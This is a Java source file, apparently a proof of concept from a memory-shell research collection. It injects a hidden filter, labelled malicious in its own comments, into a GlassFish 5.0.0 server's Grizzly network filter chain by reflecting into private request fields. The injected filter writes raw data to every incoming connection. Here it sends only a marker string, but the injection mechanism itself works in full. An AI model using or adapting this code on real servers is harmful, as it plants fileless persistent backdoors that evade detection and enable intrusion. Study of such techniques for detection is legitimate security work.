package org.su18.memshell.test.glassfish;


import com.sun.enterprise.web.pwc.connector.coyote.PwcCoyoteRequest;
import org.apache.catalina.connector.InputBuffer;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.RequestFacadeHelper;
import org.glassfish.grizzly.Context;
import org.glassfish.grizzly.EmptyCompletionHandler;
import org.glassfish.grizzly.filterchain.*;
import org.glassfish.grizzly.http.server.AfterServiceListener;
import org.glassfish.grizzly.http.server.Request;
import org.glassfish.grizzly.nio.transport.TCPNIOConnection;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.SelectableChannel;
import java.nio.charset.StandardCharsets;

/**
 * 使用 Grizzly 的 Filter 写入内存马
 * 在处理 Http 的 HttpServerFilter 中，afterServicesList 用来最后进行处理
 * 使用 request 添加 afterServicesList，并在其中获取 context 来添加 Filter
 * 调用：
 * req->reqFacHelper->request->inputBuffer->grizzlyRequest->afterServicesList
 * ctx->internalContext->processor
 * 测试版本：GlassFish 5.0.0
 *
 * @author su18
 */
public class AddGlassFishServiceList extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			Field f = RequestFacade.class.getDeclaredField("reqFacHelper");
			f.setAccessible(true);
			RequestFacadeHelper helper = (RequestFacadeHelper) f.get(req);

			Field f2 = RequestFacadeHelper.class.getDeclaredField("request");
			f2.setAccessible(true);
			PwcCoyoteRequest request = (PwcCoyoteRequest) f2.get(helper);

			Field f3 = PwcCoyoteRequest.class.getSuperclass().getDeclaredField("inputBuffer");
			f3.setAccessible(true);
			InputBuffer buffer = (InputBuffer) f3.get(request);

			Field f4 = InputBuffer.class.getDeclaredField("grizzlyRequest");
			f4.setAccessible(true);
			Request request1 = (Request) f4.get(buffer);
			request1.addAfterServiceListener(new FlushResponseHandler());

		} catch (Exception e) {
			e.printStackTrace();
		}

	}


	public final class FlushResponseHandler extends EmptyCompletionHandler<Object> implements AfterServiceListener {

		private final FilterChainEvent event;

		private FlushResponseHandler() {
			this.event = TransportFilter.createFlushEvent(this);
		}

		@Override
		public void onAfterService(Request request) {

			try {
				Context  internalContextImpl = request.getContext().getInternalContext();
				Class<?> c                   = Class.forName("org.glassfish.grizzly.filterchain.InternalContextImpl");
				Field    f                   = c.getSuperclass().getDeclaredField("processor");
				f.setAccessible(true);
				ListFacadeFilterChain filterChain = (ListFacadeFilterChain) f.get(internalContextImpl);

				for (Filter filter : filterChain) {
					if (filter.getClass().getName().contains("TestFilter")) {
						return;
					}
				}

				// 将我们的 filter 放在第一位
				filterChain.add(0, new TestFilter());

			} catch (Exception ignored) {

			}
		}
	}

	/**
	 * 自定义恶意 Filter，在读取时触发逻辑
	 */
	public static class TestFilter extends BaseFilter {

		@Override
		public NextAction handleRead(FilterChainContext ctx) throws IOException {
			TCPNIOConnection  connection = (TCPNIOConnection) ctx.getCloseable();
			SelectableChannel channel    = connection.getChannel();

			try {
				Class<?> c = Class.forName("sun.nio.ch.SocketChannelImpl");
				Method   m = c.getDeclaredMethod("write", ByteBuffer.class);
				m.setAccessible(true);
				m.invoke(channel, ByteBuffer.wrap("HTTP/1.1 200 OK su18 yyds".getBytes(StandardCharsets.UTF_8)));

			} catch (Exception ignored) {

			}
			return super.handleRead(ctx);
		}
	}

}

